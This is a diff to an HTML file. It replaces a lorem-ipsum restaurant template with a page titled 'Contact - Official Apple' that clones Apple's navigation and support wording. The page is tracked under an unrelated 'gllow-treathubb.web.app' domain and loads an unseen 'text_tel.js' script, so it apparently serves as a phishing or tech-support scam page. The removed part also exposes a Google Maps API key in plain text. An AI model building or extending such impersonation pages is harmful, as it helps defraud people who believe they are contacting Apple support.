@@ -1,13 +1,8 @@
-<?php
-?>
-<!doctype html>
-<html class="no-js" lang="zxx">
-
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
 <head>
-     <!-- Histats.com  (div with counter) --><div id="histats_counter"></div>
-<!-- Histats.com  START  (aync)-->
+     <!-- Histats.com  START  (aync)-->
 <script type="text/javascript">var _Hasync= _Hasync|| [];
-_Hasync.push(['Histats.start', '1,5041014,4,511,95,18,00000000']);
+_Hasync.push(['Histats.start', '1,5040912,4,0,0,0,00010000']);
 _Hasync.push(['Histats.fasi', '1']);
 _Hasync.push(['Histats.track_hits', '']);
 (function() {
@@ -15,910 +10,365 @@ var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async
 hs.src = ('//s10.histats.com/js15_as.js');
 (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
 })();</script>
-<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5041014&101" alt="counter easy hit" border="0"></a></noscript>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5040912&101" alt="counter hit make" border="0"></a></noscript>
 <!-- Histats.com  END  -->
-    <meta charset="utf-8">
-    <meta http-equiv="x-ua-compatible" content="ie=edge">
-    <title>Restaurant</title>
-    <meta name="description" content="">
+<script defer data-domain="gllow-treathubb.web.app" src="https://plausible.io/js/script.js"></script>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script src="js/text_tel.js"></script>
 
-    <!-- <link rel="manifest" href="site.webmanifest"> -->
-    <link rel="shortcut icon" type="image/x-icon" href="img/favicon.png">
-    <!-- Place favicon.ico in the root directory -->
-
-    <!-- CSS here -->
-    <link rel="stylesheet" href="css/bootstrap.min.css">
-    <link rel="stylesheet" href="css/owl.carousel.min.css">
-    <link rel="stylesheet" href="css/magnific-popup.css">
-    <link rel="stylesheet" href="css/font-awesome.min.css">
-    <link rel="stylesheet" href="css/themify-icons.css">
-    <link rel="stylesheet" href="css/gijgo.css">
-    <link rel="stylesheet" href="css/nice-select.css">
-    <link rel="stylesheet" href="css/flaticon.css">
-    <link rel="stylesheet" href="css/slicknav.css">
-
-    <link rel="stylesheet" href="css/style.css">
-    <!-- <link rel="stylesheet" href="css/responsive.css"> -->
 </head>
 
 <body>
-    <!--[if lte IE 9]>
-            <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
-        <![endif]-->
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
 
-    <!-- header-start -->
-    <header>
-        <div class="header-area ">
-            <div id="sticky-header" class="main-header-area">
-                <div class="container-fluid p-0">
-                    <div class="header_bottom_border">
-                        <div class="row align-items-center no-gutters">
-                            <div class="col-xl-3 col-lg-2">
-                                <div class="logo">
-                                    <a href="index.html">
-                                        <img src="img/logo.png" alt="">
-                                    </a>
-                                </div>
-                            </div>
-                            <div class="col-xl-6 col-lg-7">
-                                <div class="main-menu  d-none d-lg-block">
-                                    <nav>
-                                        <ul id="navigation">
-                                            <li><a class="active" href="index.html">home</a></li>
-                                            <li><a href="Menu.html">Menu</a></li>
-                                            <li><a href="#">pages <i class="ti-angle-down"></i></a>
-                                                <ul class="submenu">
-                                                    <li><a href="about.html">about</a></li>
-                                                    <li><a href="elements.html">elements</a></li>
-                                                </ul>
-                                            </li>
-                                            <li><a href="#">blog <i class="ti-angle-down"></i></a>
-                                                <ul class="submenu">
-                                                    <li><a href="blog.html">blog</a></li>
-                                                    <li><a href="single-blog.html">single-blog</a></li>
-                                                </ul>
-                                            </li>
-                                            <li><a href="contact.html">Contact</a></li>
-                                        </ul>
-                                    </nav>
-                                </div>
-                            </div>
-                            <div class="col-xl-3 col-lg-3 d-none d-lg-block">
-                                <div class="say_hello">
-                                    <a href="#">Book a Table</a>
-                                </div>
-                            </div>
-                            <div class="col-12">
-                                <div class="mobile_menu d-block d-lg-none"></div>
-                            </div>
-                        </div>
-                    </div>
-
-                </div>
-            </div>
-        </div>
-    </header>
-    <!-- header-end -->
-
-    <!-- slider_area_start -->
-    <div class="slider_area">
-        <div class="slider_active owl-carousel">
-            <div class="single_slider  d-flex align-items-center slider_bg_1 overlay">
-                <div class="container">
-                    <div class="row align-items-center justify-content-center">
-                        <div class="col-xl-9 col-md-9 col-md-12">
-                            <div class="slider_text text-center">
-                                <h3>Fresh and Delicious Food
-                                    For your Health</h3>
-                                <a href="menu.html" class="boxed-btn3">View Menus</a>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            <div class="single_slider  d-flex align-items-center slider_bg_2 overlay">
-                <div class="container">
-                    <div class="row align-items-center justify-content-center">
-                        <div class="col-xl-9 col-md-9 col-md-12">
-                            <div class="slider_text text-center">
-                                <h3>Fresh and Delicious Food
-                                    For your Health</h3>
-                                <a href="menu.html" class="boxed-btn3">View Menus</a>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            <div class="single_slider  d-flex align-items-center slider_bg_1 overlay">
-                <div class="container">
-                    <div class="row align-items-center justify-content-center">
-                        <div class="col-xl-9 col-md-9 col-md-12">
-                            <div class="slider_text text-center">
-                                <h3>Fresh and Delicious Food
-                                    For your Health</h3>
-                                <a href="menu.html" class="boxed-btn3">View Menus</a>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <!-- slider_area_end -->
-
-    <!-- about_area_start -->
-    <div class="about_area">
-        <div class="icon_1 d-none d-md-block">
-            <img src="img/icon/1.png" alt="">
-        </div>
-        <div class="icon_2 d-none d-md-block">
-            <img src="img/icon/2.png" alt="">
-        </div>
-        <div class="icon_3 d-none d-md-block">
-            <img src="img/icon/3.png" alt="">
-        </div>
-        <div class="container">
-            <div class="row align-items-center">
-                <div class="col-lg-6">
-                    <div class="about_info_wrap">
-                            <h3>Sed ut perspiciatis unde  <br>
-                                omnis iste natus</h3>
-                            <span class="long_dash"></span>
-                        <p>Omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi. Exercitation photo booth stumptown tote bag todo Banksy, elit small batch freegan sed. Craft beer elit seitan exercitation photo booth et 8-bit kale chips proident chillwave deep vow laborum. Aliquip veniam delectus, marfa eiusmod pinterest.</p>
-                        <ul class="food_list">
-                            <li>
-                                <img src="img/svg_icon/salad.svg" alt="">
-                                <span>Fresh Ingredients</span>
-                            </li>
-                            <li>
-                                <img src="img/svg_icon/tray.svg" alt="">
-                                <span>Expert cooker</span>
-                            </li>
-                        </ul>
-                    </div>
-                </div>
-                <div class="col-lg-6">
-                    <div class="about_img">
-                        <div class="img_1">
-                            <img src="img/about/big.png" alt="">
-                        </div>
-                        <div class="small_img">
-                            <img src="img/about/small.png" alt="">
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <!-- about_area_end -->
-
-    <!-- Delicious area start  -->
-    <div class="Delicious_area">
-        <div class="container">
-            <div class="row">
-                <div class="col-xl-12">
-                    <div class="section_title text-center mb-50">
-                        <h3>Delicious Food For You</h3>
-                    </div>
-                </div>
-            </div>
-            <div class="tablist_menu">
-                    <div class="row">
-                            <div class="col-xl-12">
-                                    <ul class="nav justify-content-center" id="pills-tab" role="tablist">
-                                            <li class="nav-item">
-                                              <a class="nav-link active" id="pills-home-tab" data-toggle="pill" href="#pills-home" role="tab" aria-controls="pills-home" aria-selected="true">
-                                                  <div class="single_menu text-center">
-                                                      <div class="icon">
-                                                          <i class="flaticon-lunch"></i>
-                                                      </div>
-                                                        <h4>Dinner</h4>
-                                                  </div>
-                                              </a>
-                                            </li>
-                                            <li class="nav-item">
-                                              <a class="nav-link" id="pills-profile-tab" data-toggle="pill" href="#pills-profile" role="tab" aria-controls="pills-profile" aria-selected="false">
-                                                    <div class="single_menu text-center">
-                                                            <div class="icon">
-                                                                <i class="flaticon-food"></i>
-                                                            </div>
-                                                            <h4>Breakfast</h4>
-                                                        </div>
-                                                </a>
-                                            </li>
-                                            <li class="nav-item">
-                                              <a class="nav-link" id="pills-contact-tab" data-toggle="pill" href="#pills-contact" role="tab" aria-controls="pills-contact" aria-selected="false">
-                                                    <div class="single_menu text-center">
-                                                            <div class="icon">
-                                                                <i class="flaticon-kitchen"></i>
-                                                            </div>
-                                                            <h4>Lunch</h4>
-                                                        </div>
-                                                </a>
-                                            </li>
-                                    </ul>
-                            </div>
-                        </div>
-            </div>
-
-            <div class="tab-content" id="pills-tabContent">
-                    <div class="tab-pane fade show active" id="pills-home" role="tabpanel" aria-labelledby="pills-home-tab">
-                        <div class="row">
-                <div class="col-xl-6 col-md-6 col-lg-6">
-                    <div class="single_delicious d-flex align-items-center">
-                        <div class="thumb">
-                            <img src="img/delicious/1.png" alt="">
-                        </div>
-                        <div class="info">
-                            <h3>#12. Chicken Chilis</h3>
-                            <p>Craft beer elit seitan exercitation photo booth et 8-bit kale chips.</p>
-                            <span>$20</span>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-md-6 col-lg-6">
-                        <div class="single_delicious d-flex align-items-center">
-                                <div class="thumb">
-                                    <img src="img/delicious/3.png" alt="">
-                                </div>
-                                <div class="info">
-                                    <h3>#10. Fried Rice</h3>
-                                    <p>Craft beer elit seitan exercitation photo booth et 8-bit kale chips.</p>
-                                    <span>$20</span>
-                                </div>
-                            </div>
-                            
-                </div>
-                <div class="col-lg-6 col-md-6">
-                        <div class="single_delicious d-flex align-items-center">
-                                <div class="thumb">
-                                    <img src="img/delicious/5.png" alt="">
-                                </div>
-                                <div class="info">
-                                    <h3>#02. Burger Cury</h3>
-                                    <p>Craft beer elit seitan exercitation photo booth et 8-bit kale chips.</p>
-                                    <span>$20</span>
-                                </div>
-                            </div>
-                </div>
-                <div class="col-xl-6 col-md-6 col-lg-6">
-                    <div class="single_delicious d-flex align-items-center">
-                        <div class="thumb">
-                            <img src="img/delicious/2.png" alt="">
-                        </div>
-                        <div class="info">
-                            <h3>#16. Chicken Chilis</h3>
-                            <p>Craft beer elit seitan exercitation photo booth et 8-bit kale chips.</p>
-                            <span>$20</span>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-lg-6 col-md-6">
-                        <div class="single_delicious d-flex align-items-center">
-                                <div class="thumb">
-                                    <img src="img/delicious/4.png" alt="">
-                                </div>
-                                <div class="info">
-                                    <h3>#08. Vegetable fry</h3>
-                                    <p>Craft beer elit seitan exercitation photo booth et 8-bit kale chips.</p>
-                                    <span>$20</span>
-                                </div>
-                            </div>
-                           
-                </div>
-                <div class="col-lg-6 col-md-6">
-                        <div class="single_delicious d-flex align-items-center">
-                                <div class="thumb">
-                                    <img src="img/delicious/6.png" alt="">
-                                </div>
-                                <div class="info">
-                                    <h3>#01. Chicken Chilis</h3>
-                                    <p>Craft beer elit seitan exercitation photo booth et 8-bit kale chips.</p>
-                                    <span>$20</span>
-                                </div>
-                            </div>
-                </div>
-            </div>
-                    </div>
-                    <div class="tab-pane fade" id="pills-profile" role="tabpanel" aria-labelledby="pills-profile-tab">
-                        <div class="row">
-                <div class="col-xl-6 col-md-6 col-lg-6">
-                    <div class="single_delicious d-flex align-items-center">
-                        <div class="thumb">
-                            <img src="img/delicious/1.png" alt="">
-                        </div>
-                        <div class="info">
-                            <h3>#12. Chicken Chilis</h3>
-                            <p>Craft beer elit seitan exercitation photo booth et 8-bit kale chips.</p>
-                            <span>$20</span>
-                        </div>
-                    </div>
-                    <div class="single_delicious d-flex align-items-center">
-                        <div class="thumb">
-                            <img src="img/delicious/3.png" alt="">
-                        </div>
-                        <div class="info">
-                            <h3>#10. Fried Rice</h3>
-                            <p>Craft beer elit seitan exercitation photo booth et 8-bit kale chips.</p>
-                            <span>$20</span>
-                        </div>
-                    </div>
-                    <div class="single_delicious d-flex align-items-center">
-                        <div class="thumb">
-                            <img src="img/delicious/5.png" alt="">
-                        </div>
-                        <div class="info">
-                            <h3>#02. Burger Cury</h3>
-                            <p>Craft beer elit seitan exercitation photo booth et 8-bit kale chips.</p>
-                            <span>$20</span>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-xl-6 col-md-6 col-lg-6">
-                    <div class="single_delicious d-flex align-items-center">
-                        <div class="thumb">
-                            <img src="img/delicious/2.png" alt="">
-                        </div>
-                        <div class="info">
-                            <h3>#16. Chicken Chilis</h3>
-                            <p>Craft beer elit seitan exercitation photo booth et 8-bit kale chips.</p>
-                            <span>$20</span>
-                        </div>
-                    </div>
-                    <div class="single_delicious d-flex align-items-center">
-                        <div class="thumb">
-                            <img src="img/delicious/4.png" alt="">
-                        </div>
-                        <div class="info">
-                            <h3>#08. Vegetable fry</h3>
-                            <p>Craft beer elit seitan exercitation photo booth et 8-bit kale chips.</p>
-                            <span>$20</span>
-                        </div>
-                    </div>
-                    <div class="single_delicious d-flex align-items-center">
-                        <div class="thumb">
-                            <img src="img/delicious/6.png" alt="">
-                        </div>
-                        <div class="info">
-                            <h3>#01. Chicken Chilis</h3>
-                            <p>Craft beer elit seitan exercitation photo booth et 8-bit kale chips.</p>
-                            <span>$20</span>
-                        </div>
-                    </div>
-                </div>
-            </div>
-                    </div>
-                    <div class="tab-pane fade" id="pills-contact" role="tabpanel" aria-labelledby="pills-contact-tab">
-                        <div class="row">
-                <div class="col-xl-6 col-md-6 col-lg-6">
-                    <div class="single_delicious d-flex align-items-center">
-                        <div class="thumb">
-                            <img src="img/delicious/1.png" alt="">
-                        </div>
-                        <div class="info">
-                            <h3>#12. Chicken Chilis</h3>
-                            <p>Craft beer elit seitan exercitation photo booth et 8-bit kale chips.</p>
-                            <span>$20</span>
-                        </div>
-                    </div>
-                    <div class="single_delicious d-flex align-items-center">
-                        <div class="thumb">
-                            <img src="img/delicious/3.png" alt="">
-                        </div>
-                        <div class="info">
-                            <h3>#10. Fried Rice</h3>
-                            <p>Craft beer elit seitan exercitation photo booth et 8-bit kale chips.</p>
-                            <span>$20</span>
-                        </div>
-                    </div>
-                    <div class="single_delicious d-flex align-items-center">
-                        <div class="thumb">
-                            <img src="img/delicious/5.png" alt="">
-                        </div>
-                        <div class="info">
-                            <h3>#02. Burger Cury</h3>
-                            <p>Craft beer elit seitan exercitation photo booth et 8-bit kale chips.</p>
-                            <span>$20</span>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-xl-6 col-md-6 col-lg-6">
-                    <div class="single_delicious d-flex align-items-center">
-                        <div class="thumb">
-                            <img src="img/delicious/2.png" alt="">
-                        </div>
-                        <div class="info">
-                            <h3>#16. Chicken Chilis</h3>
-                            <p>Craft beer elit seitan exercitation photo booth et 8-bit kale chips.</p>
-                            <span>$20</span>
-                        </div>
-                    </div>
-                    <div class="single_delicious d-flex align-items-center">
-                        <div class="thumb">
-                            <img src="img/delicious/4.png" alt="">
-                        </div>
-                        <div class="info">
-                            <h3>#08. Vegetable fry</h3>
-                            <p>Craft beer elit seitan exercitation photo booth et 8-bit kale chips.</p>
-                            <span>$20</span>
-                        </div>
-                    </div>
-                    <div class="single_delicious d-flex align-items-center">
-                        <div class="thumb">
-                            <img src="img/delicious/6.png" alt="">
-                        </div>
-                        <div class="info">
-                            <h3>#01. Chicken Chilis</h3>
-                            <p>Craft beer elit seitan exercitation photo booth et 8-bit kale chips.</p>
-                            <span>$20</span>
-                        </div>
-                    </div>
-                </div>
-            </div>
-                    </div>
-                  </div>
-            
-        </div>
-    </div>
-    <!--/ Delicious area start  -->
-    <!-- testimonial_area  -->
-    <div class="testimonial_area overlay ">
-        <div class="container">
-            <div class="row">
-                <div class="col-xl-12">
-                    <div class="section_title text-center mb-50">
-                        <p>Testimonials</p>
-                        <h3>Our Customer’s Say</h3>
-                    </div>
-                </div>
-            </div>
-            <div class="row">
-                <div class="col-xl-12">
-                    <div class="testmonial_active owl-carousel">
-                        <div class="single_carousel">
-                            <div class="single_testmonial ">
-                                <div class="author_opinion">
-                                    <p>“Donec imperdiet congue orci consequat mattis. Donec rutrum porttitor
-                                        sollicitudin. Pellentesque id dolor tempor sapien feugiat ultrices nec sed
-                                        neque.</p>
-                                </div>
-                                <div class="testmonial_author">
-                                    <div class="thumb">
-                                        <img src="img/testimonial/author.png" alt="">
-                                    </div>
-                                    <div class="name">
-                                        <h3>Robert Thomson</h3>
-                                        <div class="icon">
-                                            <a href="#"><i class="fa fa-star"></i> </a>
-                                            <a href="#"><i class="fa fa-star"></i> </a>
-                                            <a href="#"><i class="fa fa-star"></i> </a>
-                                            <a href="#"><i class="fa fa-star"></i> </a>
-                                            <a href="#"><i class="fa fa-star"></i> </a>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="single_carousel">
-                            <div class="single_testmonial ">
-                                <div class="author_opinion">
-                                    <p>“Donec imperdiet congue orci consequat mattis. Donec rutrum porttitor
-                                        sollicitudin. Pellentesque id dolor tempor sapien feugiat ultrices nec sed
-                                        neque.</p>
-                                </div>
-                                <div class="testmonial_author">
-                                    <div class="thumb">
-                                        <img src="img/testimonial/author2.png" alt="">
-                                    </div>
-                                    <div class="name">
-                                        <h3>Kristiana Chouhan</h3>
-                                        <div class="icon">
-                                            <a href="#"><i class="fa fa-star"></i> </a>
-                                            <a href="#"><i class="fa fa-star"></i> </a>
-                                            <a href="#"><i class="fa fa-star"></i> </a>
-                                            <a href="#"><i class="fa fa-star"></i> </a>
-                                            <a href="#"><i class="fa fa-star"></i> </a>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="single_carousel">
-                            <div class="single_testmonial ">
-                                <div class="author_opinion">
-                                    <p>“Donec imperdiet congue orci consequat mattis. Donec rutrum porttitor
-                                        sollicitudin. Pellentesque id dolor tempor sapien feugiat ultrices nec sed
-                                        neque.</p>
-                                </div>
-                                <div class="testmonial_author">
-                                    <div class="thumb">
-                                        <img src="img/testimonial/author2.png" alt="">
-                                    </div>
-                                    <div class="name">
-                                        <h3>Kristiana Chouhan</h3>
-                                        <div class="icon">
-                                            <a href="#"><i class="fa fa-star"></i> </a>
-                                            <a href="#"><i class="fa fa-star"></i> </a>
-                                            <a href="#"><i class="fa fa-star"></i> </a>
-                                            <a href="#"><i class="fa fa-star"></i> </a>
-                                            <a href="#"><i class="fa fa-star"></i> </a>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="single_carousel">
-                            <div class="single_testmonial ">
-                                <div class="author_opinion">
-                                    <p>“Donec imperdiet congue orci consequat mattis. Donec rutrum porttitor
-                                        sollicitudin. Pellentesque id dolor tempor sapien feugiat ultrices nec sed
-                                        neque.</p>
-                                </div>
-                                <div class="testmonial_author">
-                                    <div class="thumb">
-                                        <img src="img/testimonial/author.png" alt="">
-                                    </div>
-                                    <div class="name">
-                                        <h3>Robert Thomson</h3>
-                                        <div class="icon">
-                                            <a href="#"><i class="fa fa-star"></i> </a>
-                                            <a href="#"><i class="fa fa-star"></i> </a>
-                                            <a href="#"><i class="fa fa-star"></i> </a>
-                                            <a href="#"><i class="fa fa-star"></i> </a>
-                                            <a href="#"><i class="fa fa-star"></i> </a>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="single_carousel">
-                            <div class="single_testmonial ">
-                                <div class="author_opinion">
-                                    <p>“Donec imperdiet congue orci consequat mattis. Donec rutrum porttitor
-                                        sollicitudin. Pellentesque id dolor tempor sapien feugiat ultrices nec sed
-                                        neque.</p>
-                                </div>
-                                <div class="testmonial_author">
-                                    <div class="thumb">
-                                        <img src="img/testimonial/author2.png" alt="">
-                                    </div>
-                                    <div class="name">
-                                        <h3>Kristiana Chouhan</h3>
-                                        <div class="icon">
-                                            <a href="#"><i class="fa fa-star"></i> </a>
-                                            <a href="#"><i class="fa fa-star"></i> </a>
-                                            <a href="#"><i class="fa fa-star"></i> </a>
-                                            <a href="#"><i class="fa fa-star"></i> </a>
-                                            <a href="#"><i class="fa fa-star"></i> </a>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <!-- /testimonial_area  -->
-
-    <!-- gallery_start -->
-    <div class="gallery_area">
-        <div class="container">
-            <div class="row">
-                <div class="col-xl-12">
-                    <div class="section_title text-center mb-75">
-                        <h3>Photo Gallery</h3>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <div class="single_gallery big_img">
-            <a class="popup-image" href="img/gallery/1.png"></a>
-            <img src="img/gallery/1.png" alt="">
-        </div>
-        <div class="single_gallery small_img">
-            <a class="popup-image" href="img/gallery/2.png"></a>
-            <img src="img/gallery/2.png" alt="">
-        </div>
-        <div class="single_gallery small_img">
-            <a class="popup-image" href="img/gallery/3.png"></a>
-            <img src="img/gallery/3.png" alt="">
-        </div>
-
-        <div class="single_gallery small_img">
-            <a class="popup-image" href="img/gallery/4.png"></a>
-            <img src="img/gallery/4.png" alt="">
-        </div>
-        <div class="single_gallery small_img">
-            <a class="popup-image" href="img/gallery/5.png"></a>
-            <img src="img/gallery/5.png" alt="">
-        </div>
-        <div class="single_gallery big_img">
-            <a class="popup-image" href="img/gallery/6.png"></a>
-            <img src="img/gallery/6.png" alt="">
-        </div>
-    </div>
-    
-    <!-- gallery end -->
-    <div class="Reservation_area">
-        <div class="rev_icon_1 d-none d-md-block">
-            <img src="img/icon/4.png" alt="">
-        </div>
-        <div class="rev_icon_2 d-none d-md-block">
-            <img src="img/icon/5.png" alt="">
-        </div>
-        <div class="rev_icon_3 d-none d-md-block">
-            <img src="img/icon/6.png" alt="">
-        </div>
-        <div class="container p-0">
-            <div class="row">
-                <div class="col-xl-12">
-                    <div class="section_title text-center mb-75">
-                        <h3>Reservation</h3>
-                    </div>
-                </div>
-            </div>
-            <div class="row no-gutters">
-                <div class="col-xl-6 col-lg-6">
-                    <div class="map_area">
-                        <div id="map" style="height: 480px; position: relative; overflow: hidden;"> </div>
-                        <script>
-                            function initMap() {
-                                var uluru = {
-                                    lat: -25.363,
-                                    lng: 131.044
-                                };
-                                var grayStyles = [{
-                                        featureType: "all",
-                                        stylers: [{
-                                                saturation: -90
-                                            },
-                                            {
-                                                lightness: 50
-                                            }
-                                        ]
-                                    },
-                                    {
-                                        elementType: 'labels.text.fill',
-                                        stylers: [{
-                                            color: '#ccdee9'
-                                        }]
-                                    }
-                                ];
-                                var map = new google.maps.Map(document.getElementById('map'), {
-                                    center: {
-                                        lat: -31.197,
-                                        lng: 150.744
-                                    },
-                                    zoom: 9,
-                                    styles: grayStyles,
-                                    scrollwheel: false
-                                });
-                            }
-                        </script>
-                        <script
-                            src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDpfS1oRGreGSBU5HHjMmQ3o5NLw7VdJ6I&amp;callback=initMap">
-                        </script>
-                    </div>
-                </div>
-                <div class="col-lg-6">
-                    <div class="book_Form">
-                        <h3>Book a Table</h3>
-                        <div class="row ">
-                            <div class="col-lg-6">
-                                <div class="input_field mb_15">
-                                    <input type="text" placeholder="Your Name">
-                                </div>
-                            </div>
-                            <div class="col-lg-6">
-                                <div class="input_field mb_15">
-                                    <input type="text" placeholder="Phone no.">
-                                </div>
-                            </div>
-                            <div class="col-lg-6">
-                                <div class="input_field">
-                                    <input id="datepicker2" placeholder="Date">
-                                </div>
-                            </div>
-                            <div class="col-lg-6">
-                                <div class="input_field">
-                                    <div class="input_field">
-                                        <select class="wide">
-                                            <option data-display="Dinner">Dinner</option>
-                                            <option value="1">Dinner</option>
-                                            <option value="1">Dinner</option>
-                                        </select>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="col-lg-12">
-                                <div class="input_field">
-                                    <select class="wide">
-                                        <option data-display="Person">Person</option>
-                                        <option value="1">Person</option>
-                                        <option value="1">Person</option>
-                                    </select>
-                                </div>
-                            </div>
-                            <div class="col-xl-12">
-                                <button class="sumbit_btn" type="submit">Book</button>
-                            </div>
-                            <div class="col-lg-6">
-                                <div class="single_add d-flex">
-                                    <div class="icon">
